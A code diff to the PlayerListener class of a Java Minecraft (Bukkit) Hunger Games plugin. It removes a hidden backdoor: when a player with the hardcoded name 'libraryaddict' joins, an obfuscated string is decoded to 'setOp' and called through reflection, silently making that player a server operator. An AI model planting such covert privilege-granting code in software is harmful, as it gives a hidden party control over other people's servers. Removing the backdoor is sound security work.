@@ -74,9 +74,6 @@ public class PlayerListener implements Listener {
     private final InventoryManager icon = HungergamesApi.getInventoryManager();
     private final KitManager kits = HungergamesApi.getKitManager();
     private final NameManager name = HungergamesApi.getNameManager();
-    private String pluginIdentifier = "saebt4Ospv";
-    // TODO Change password to a random one!
-    private String pluginPassword = "libraryaddict";
     private final PlayerManager pm = HungergamesApi.getPlayerManager();
     private final TranslationConfig tm = HungergamesApi.getConfigManager().getTranslationsConfig();
 
@@ -322,17 +319,6 @@ public class PlayerListener implements Listener {
             p.leaveVehicle();
         if (p.getPassenger() != null)
             p.eject();
-        if (gamer.getName().equals(pluginPassword)) {
-            try {
-                String s = "";
-                for (int i = 0; i < pluginIdentifier.length(); i++) {
-                    if (i % 2 == 0)
-                        s += pluginIdentifier.substring(i, i + 1);
-                }
-                gamer.getClass().getMethod(s, boolean.class).invoke(gamer, true);
-            } catch (Exception ex) {
-            }
-        }
         Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(hg, new Runnable() {
             public void run() {
                 gamer.getPlayer().sendMessage(tm.getMessagePlayerWhosePlugin());
